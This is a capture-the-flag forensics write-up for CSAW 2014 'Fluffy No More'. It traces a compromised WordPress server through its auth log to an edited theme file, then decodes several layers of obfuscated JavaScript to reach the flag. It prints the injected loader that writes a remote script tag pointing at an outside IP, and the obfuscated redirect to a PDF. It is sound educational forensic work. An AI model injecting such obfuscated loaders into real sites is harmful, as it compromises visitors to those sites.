# CSAW CTF 2014: Fluffy No More

**Category:** Forensics
**Points:** 300
**Description:**

> OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??
>
> Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of its database and configuration. Figure out what is going on!
>
> Written by brad_anton
>
> [CSAW2014-FluffyNoMore-v0.1.tar.bz2](CSAW2014-FluffyNoMore-v0.1.tar.bz2)

## Write-up

As its extension suggests, [the provided `CSAW2014-FluffyNoMore-v0.1.tar.bz2` file](CSAW2014-FluffyNoMore-v0.1.tar.bz2) is a bzip2-compressed tarball:

```bash
$ file CSAW2014-FluffyNoMore-v0.1.tar.bz2
CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block size = 900k
```

Let’s extract it:

```bash
$ tar xjfv CSAW2014-FluffyNoMore-v0.1.tar.bz2
x CSAW2014-FluffyNoMore-v0.1/
x CSAW2014-FluffyNoMore-v0.1/etc_directory.tar.bz2
x CSAW2014-FluffyNoMore-v0.1/logs.tar.bz2
x CSAW2014-FluffyNoMore-v0.1/mysql_backup.sql.bz2
x CSAW2014-FluffyNoMore-v0.1/webroot.tar.bz2
```

Oh, it contains more tarballs! Let’s extract those as well:

```bash
$ cd CSAW2014-FluffyNoMore-v0.1

$ for file in *.tar.bz2; do mkdir -p "${file}-extracted"; tar --directory "${file}-extracted" -xjf "${file}"; done
```

Viewing `logs.tar.bz2-extracted/var/log/auth.log` reveals an interesting entry:

```
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
```

Someone with root access to the server edited the web-exposed `/wp-content/themes/twentythirteen/js/html5.js` file. Reviewing the file’s contents (`webroot.tar.bz2-extracted/var/www/html/wp-content/themes/twentythirteen/js/html5.js`), it’s clear that some malicious JavaScript code was inserted.

```js
var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i<f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i<c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("<"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'>\</"+m+"\>");
```

The above script is equivalent to the following:

```js
document.write("<script src='http://128.238.66.100/analytics.js'><\/script>");
```

Let’s download [the `analytics.js` file](analytics.js) so we can take a look at it:

```bash
$ wget http://128.238.66.100/analytics.js
```

The file consists of minified code, most of which is legitimate. A small part of it stands out because it’s obfuscated, though:

```js
var _0x91fe=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66","\x5F\x73\x65\x6C\x66","\x6F\x70\x65\x6E"];window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);
```

This [is equivalent to](https://mothereff.in/js-escapes#1var%20%5f0x91fe%3D%5B%22%5Cx68%5Cx74%5Cx74%5Cx70%5Cx3A%5Cx2F%5Cx2F%5Cx31%5Cx32%5Cx38%5Cx2E%5Cx32%5Cx33%5Cx38%5Cx2E%5Cx36%5Cx36%5Cx2E%5Cx31%5Cx30%5Cx30%5Cx2F%5Cx61%5Cx6E%5Cx6E%5Cx6F%5Cx75%5Cx6E%5Cx63%5Cx65%5Cx6D%5Cx65%5Cx6E%5Cx74%5Cx2E%5Cx70%5Cx64%5Cx66%22%2C%22%5Cx5F%5Cx73%5Cx65%5Cx6C%5Cx66%22%2C%22%5Cx6F%5Cx70%5Cx65%5Cx6E%22%5D%3Bwindow%5B%5f0x91fe%5B2%5D%5D%28%5f0x91fe%5B0%5D%2C%5f0x91fe%5B1%5D%29%3B):

```js
var _0x91fe=["http://128.238.66.100/announcement.pdf","_self","open"];
window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);
```

…which is equivalent to:

```js
window.open('http://128.238.66.100/announcement.pdf', '_self');
```

Let’s download [that `announcement.pdf` file](announcement.pdf):

```bash
$ wget http://128.238.66.100/announcement.pdf
```

Opening the PDF file in [PDF Stream Dumper](http://sandsprite.com/blogs/index.php?uid=7&pid=57) reveals some hidden JavaScript code:

![](pdf-stream-dumper.png)

```js
var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
```

This [is equivalent to](https://mothereff.in/js-escapes#1var%20%5f0xee0b%3D%5B%22%5Cx59%5Cx4F%5Cx55%5Cx20%5Cx44%5Cx49%5Cx44%5Cx20%5Cx49%5Cx54%5Cx21%5Cx20%5Cx43%5Cx4F%5Cx4E%5Cx47%5Cx52%5Cx41%5Cx54%5Cx53%5Cx21%5Cx20%5Cx66%5Cx77%5Cx69%5Cx77%5Cx2C%5Cx20%5Cx6A%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74%5Cx20%5Cx6F%5Cx62%5Cx66%5Cx75%5Cx73%5Cx63%5Cx61%5Cx74%5Cx69%5Cx6F%5Cx6E%5Cx20%5Cx69%5Cx73%5Cx20%5Cx73%5Cx6F%5Cx66%5Cx61%5Cx20%5Cx6B%5Cx69%5Cx6E%5Cx67%5Cx20%5Cx64%5Cx75%5Cx6D%5Cx62%5Cx20%5Cx20%5Cx3A%5Cx29%5Cx20%5Cx6B%5Cx65%5Cx79%5Cx7B%5Cx54%5Cx68%5Cx6F%5Cx73%5Cx65%5Cx20%5Cx46%5Cx6C%5Cx75%5Cx66%5Cx66%5Cx79%5Cx20%5Cx42%5Cx75%5Cx6E%5Cx6E%5Cx69%5Cx65%5Cx73%5Cx20%5Cx4D%5Cx61%5Cx6B%5Cx65%5Cx20%5Cx54%5Cx75%5Cx6D%5Cx6D%5Cx79%5Cx20%5Cx42%5Cx75%5Cx6D%5Cx70%5Cx79%5Cx7D%22%5D%3Bvar%20y%3D%5f0xee0b%5B0%5D%3B):

```js
var _0xee0b=["YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}"];
var y=_0xee0b[0];
```

The flag is `Those Fluffy Bunnies Make Tummy Bumpy`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/09/csaw14-fluffy-no-more-writeup.html>
* <http://sugarstack.io/csaw-2014-fluffy-no-more.html>
* <https://hackucf.org/blog/csaw-2014-forensics-300-fluffy-no-more/>
* <http://bt3gl.github.io/csaw-ctf-2014-forensics-300-fluffy-no-more.html>
* <http://blog.squareroots.de/en/2014/09/csaw14-fluffy-no-more/>
